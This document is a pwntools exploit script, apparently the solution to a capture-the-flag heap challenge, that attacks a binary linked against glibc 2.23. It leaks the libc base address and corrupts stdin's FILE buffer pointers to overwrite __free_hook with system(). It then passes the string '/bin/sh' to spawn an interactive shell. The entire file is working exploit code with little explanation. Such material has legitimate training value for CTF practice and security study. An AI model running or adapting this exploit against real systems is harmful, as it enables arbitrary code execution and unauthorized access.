#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './pwn'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

debug = 0
if debug:
    io = process('./pwn')
else:
    io = remote('0.0.0.0',10086)

elf = ELF('./pwn')
libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

def p(script = '0'):
    if script == '0':
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, script)

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

add_30 = b'\x7b'
add_20 = b'\x5b'
dele_30 = b'\x7d'
dele_20 = b'\x5d'
call_get_char = b'\x28'

payload = add_30 + dele_30 + add_20 + add_30 + dele_30 + dele_20  # b'\x2a' + add_20 + add_20 + add_30 + b'\x28'
payload += add_30 + b'\x2a' + add_20 + call_get_char*0x28 + add_20 + dele_30
io.sendline(payload)
#p("b malloc\nc\n")
io.send(b'+\n' + b'1'*0x401 + b'\n' + b'+\n' )
io.sendline(str(0x68732f6e69622f).encode())
io.recvuntil(b'0\n')
libc.address = int(io.recvline()[:-1],10) - 0x3c4b98
leak("libc", libc.address)

log.info("sending after modify top")
pause()
target_addr = libc.address + 0x3c4918 # _IO_2_1_stdin->_IO_buf_base
io.send(p64(target_addr))
# modifying (struct _IO_FILE*) _IO_2_1_stdin; _IO_2_1_stdin->_IO_write_base 
## read_ptr = read_end > read_base, so sending data will fill the buffer which is pointint _IO_2_1_stdin->write_base first
payload = flat(
    0, 0, 0, libc.symbols['__free_hook'], libc.symbols['__free_hook'] + 0x100)
io.send(payload)

log.info("sending to free_hook")
pause()
io.sendline(p64(libc.sym['system']))


io.interactive()
